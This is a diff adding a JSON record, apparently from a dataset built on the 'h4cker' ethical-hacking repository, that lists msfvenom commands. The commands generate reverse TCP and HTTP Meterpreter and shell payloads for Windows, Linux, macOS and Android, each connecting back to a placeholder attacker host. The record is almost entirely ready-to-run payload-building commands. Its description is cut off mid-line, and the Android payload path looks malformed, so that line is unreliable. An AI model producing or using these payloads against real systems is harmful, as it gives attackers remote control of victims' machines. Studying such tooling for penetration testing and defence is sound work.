@@ -1,0 +1,27 @@
+{
+  "id": "temp_4175913e6671",
+  "category": "temp",
+  "title": "msfvenom",
+  "description": "# MSFVenom\n\nMsfVenom is a Metasploit standalone payload generator as a replacement for msfpayload and msfencode.\n\n## Creating Binaries\nThe following create different binaries for meterpreter and reverse TCP shells:\n\n### Creates a Reverse TCP Meterpreter Shell - Payload for Windows\n\n```\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST={HOST/IP} LPORT={PORT} -f exe > payload.exe\n```\n\n### Creates a simple HTTP Payload for Windows\n```\nmsfvenom -p windows/meterpreter/reverse_http LHOST={HOST/IP} LPO",
+  "payloads": [
+    "# MSFVenom",
+    "MsfVenom is a Metasploit standalone payload generator as a replacement for msfpayload and msfencode.",
+    "## Creating Binaries",
+    "The following create different binaries for meterpreter and reverse TCP shells:",
+    "### Creates a Reverse TCP Meterpreter Shell - Payload for Windows",
+    "msfvenom -p windows/meterpreter/reverse_tcp LHOST={HOST/IP} LPORT={PORT} -f exe > payload.exe",
+    "### Creates a simple HTTP Payload for Windows",
+    "msfvenom -p windows/meterpreter/reverse_http LHOST={HOST/IP} LPORT={PORT} -f exe > payload.exe",
+    "### Creates a simple TCP Shell for Linux",
+    "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={HOST/IP} LPORT={PORT} -f elf > payload.elf",
+    "### Creates a simple TCP Shell for Mac",
+    "msfvenom -p osx/x86/shell_reverse_tcp LHOST={HOST/IP} LPORT={PORT} -f macho > example.macho",
+    "### Creates a simple TCP Payload for Android",
+    "msfvenom -p android/meterpreter/reverse/tcp LHOST={HOST/IP} LPORT={PORT} R > example.apk",
+    "## Web Payloads"
+  ],
+  "source": "h4cker",
+  "references": [
+    "/workspaces/hunter-skill/h4cker/temp/Ethical_Hacking/Post_Exploitation_and_Lateral_Movement/Persistence/post_exploitation/msfvenom.md"
+  ]
+}
